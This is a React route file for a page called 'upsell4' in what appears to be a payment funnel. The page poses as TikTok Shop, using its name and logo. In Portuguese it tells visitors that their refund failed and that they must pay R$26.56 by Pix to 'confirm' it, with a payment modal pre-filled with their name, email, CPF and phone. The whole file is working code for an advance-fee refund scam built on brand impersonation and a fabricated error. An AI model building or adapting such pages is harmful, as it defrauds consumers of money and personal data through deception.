import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { goWithTracking } from "@/lib/tracking";
import { markCurrentPixPaid, setNextStep } from "@/components/upsell/funnel";
import { XCircle, Info } from "lucide-react";
import PixModal from "@/components/upsell/PixModal";
import { useCustomerData } from "@/components/upsell/useCustomerData";
import { usePixPrefetch } from "@/components/upsell/usePixPrefetch";
import { upsellTokens, shadowCard, PINK } from "@/components/upsell/tokens";

const AMOUNT = 26.56;
const DETAILS = "Confirmacao de Reembolso";

export const Route = createFileRoute("/upsell4")({
  head: () => ({
    meta: [
      { title: "Confirmacao de Reembolso | TikTok Shop" },
      {
        name: "description",
        content: "Confirme o pagamento para iniciar o processo de reembolso do seu pedido.",
      },
      { property: "og:title", content: "Confirmacao de Reembolso | TikTok Shop" },
      {
        property: "og:description",
        content: "Confirme o pagamento para iniciar o processo de reembolso do seu pedido.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: Upsell4,
});

function Upsell4() {
  const [showPixModal, setShowPixModal] = useState(false);
  const { data: customerData, isLoaded: customerLoaded } = useCustomerData();
  const { data: prefetchedPix, loading: prefetchLoading, error: prefetchError } = usePixPrefetch(
    AMOUNT,
    DETAILS,
    { data: customerData, isLoaded: customerLoaded },
  );

  useEffect(() => {
    setNextStep("/obrigado");
  }, []);

  const handleSuccess = () => {
    setShowPixModal(false);
    localStorage.setItem("up4PaymentApproved", "true");
    markCurrentPixPaid("/obrigado");
    goWithTracking("/obrigado");
  };

  return (
    <div className="min-h-screen bg-secondary/30 flex flex-col" style={upsellTokens}>
      {/* Header TikTok */}
      <div className="bg-card py-4 border-b border-border">
        <img src="/images/ttk-shop-up.png" alt="TikTok" className="h-8 mx-auto" />
      </div>

      <div className="flex-1 p-4 space-y-4 max-w-md mx-auto w-full">
        {/* Card Erro */}
        <div className={`bg-card rounded-2xl p-6 ${shadowCard} border-2 border-rose-400`}>
          <div className="bg-rose-100 rounded-xl p-6 text-center">
            <div className="w-16 h-16 rounded-full bg-rose-500 flex items-center justify-center mx-auto mb-4">
              <XCircle className="w-10 h-10 text-white" />
            </div>
            <h1 className="text-xl font-bold text-rose-500 mb-3">Erro no Processamento</h1>
            <p className="text-muted-foreground text-sm leading-relaxed">
              Identificamos uma falha no processamento do seu reembolso. Seu pagamento será
              reembolsado integralmente assim que confirmado.
            </p>
          </div>
        </div>

        {/* Card Processo de Reembolso */}
        <div className={`bg-card rounded-2xl p-6 ${shadowCard} border-l-4 border-rose-400`}>
          <div className="flex items-center gap-2 mb-4">
            <Info className="w-5 h-5 text-rose-500" />
            <h2 className="text-lg font-bold text-foreground">Processo de Reembolso</h2>
          </div>
          <ul className="space-y-3 text-muted-foreground text-sm">
            <li className="flex items-start gap-2">
              <span className="w-1.5 h-1.5 rounded-full bg-muted-foreground mt-2 flex-shrink-0"></span>
              <span>
                O valor será reembolsado automaticamente após a confirmação do pagamento
              </span>
            </li>
            <li className="flex items-start gap-2">
              <span className="w-1.5 h-1.5 rounded-full bg-muted-foreground mt-2 flex-shrink-0"></span>
              <span>O reembolso será processado na mesma forma de pagamento utilizada</span>
            </li>
            <li className="flex items-start gap-2">
              <span className="w-1.5 h-1.5 rounded-full bg-muted-foreground mt-2 flex-shrink-0"></span>
              <span>
                O prazo para compensação pode variar de acordo com sua instituição financeira
              </span>
            </li>
          </ul>
        </div>

        {/* Card Valor */}
        <div className={`bg-card rounded-2xl p-6 ${shadowCard} text-center`}>
          <p className="text-muted-foreground text-sm uppercase tracking-wide mb-2">
            VALOR A SER REEMBOLSADO
          </p>
          <p className="text-4xl font-extrabold text-rose-500 mb-3">
            R$ {AMOUNT.toFixed(2).replace(".", ",")}
          </p>
          <p className="text-muted-foreground text-sm">
            Clique abaixo para confirmar o pagamento e iniciar o processo de reembolso
          </p>
        </div>

        {/* Botão */}
        <button
          onClick={() => setShowPixModal(true)}
          className="w-full font-bold py-4 px-6 rounded-xl text-base transition-transform active:scale-[0.98] shadow-lg uppercase tracking-wide text-white"
          style={{ backgroundColor: PINK }}
        >
          CONFIRMAR PAGAMENTO
        </button>
      </div>

      <PixModal
        isOpen={showPixModal}
        onClose={() => setShowPixModal(false)}
        amount={AMOUNT}
        title="Confirmacao de Reembolso"
        customerName={customerData.name}
        customerEmail={customerData.email}
        customerCpf={customerData.cpf}
        customerPhone={customerData.phone}
        details={DETAILS}
        onSuccess={handleSuccess}
        prefetchedData={prefetchedPix}
        prefetchLoading={prefetchLoading}
        prefetchError={prefetchError}
      />
    </div>
  );
}
